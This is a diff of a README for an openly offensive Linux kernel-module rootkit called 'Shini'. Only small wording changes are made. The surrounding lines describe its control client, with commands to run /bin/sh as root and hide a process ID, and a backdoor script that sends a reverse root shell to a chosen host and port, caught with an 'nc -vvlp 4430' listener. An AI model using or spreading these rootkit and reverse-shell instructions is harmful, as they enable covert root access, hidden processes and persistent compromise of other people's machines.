@@ -1,6 +1,6 @@
 # Intro
 
-Shini is a modular lkm based rootkit(ring 0) for linux. Its purpose is to be simple, modular, 
+Shini is a modular lkm based rootkit for linux. Its purpose is to be simple, modular, 
 generic (without relying on an architecture) and to segment its logical behavior from its hook methods.
 
 # Features
@@ -98,7 +98,7 @@ usage:
 	u6_s , ..
 	u6_d , ..
 
-example:
+examples:
 
 ./cc -e /bin/sh        	 - exec /bin/sh as root
 ./cc -h 1878  -l proc  	 - hide pid 1878
@@ -130,7 +130,7 @@ Still on your machine, run the ```bdt.py```(needs root) script with the correct 
 - host, machine that receives the reverse connection.
 - port, the port.
  
-If all goes well, you will get a root shell on nc.
+If all goes well, you will receive a root shell on nc.
 
 ```console
 $ nc -vvlp 4430
